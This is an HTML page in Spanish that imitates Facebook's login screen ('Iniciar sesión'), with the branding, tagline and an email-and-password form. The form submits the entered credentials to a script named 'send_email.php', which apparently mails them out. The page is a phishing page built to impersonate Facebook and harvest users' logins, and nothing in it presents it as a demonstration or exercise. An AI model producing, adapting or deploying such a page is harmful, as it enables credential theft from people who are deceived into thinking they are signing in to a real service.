<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            text-align: center;
            margin-bottom: 20px;
        }
        .login-box {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 360px;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-box button:hover {
            background: #165dd1;
        }
        .forgot-password {
            display: block;
            margin: 10px 0;
            color: #1877f2;
            text-decoration: none;
        }
        .create-account {
            background: #42b72a;
            margin-top: 10px;
        }
        .create-account:hover {
            background: #36a420;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #1877f2; font-size: 36px;">facebook</h1>
        <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
    </div>
    <div class="login-box">
        <form action="send_email.php" method="POST">
            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        <hr>
        <button class="create-account">Crear cuenta nueva</button>
    </div>
</body>
</html>
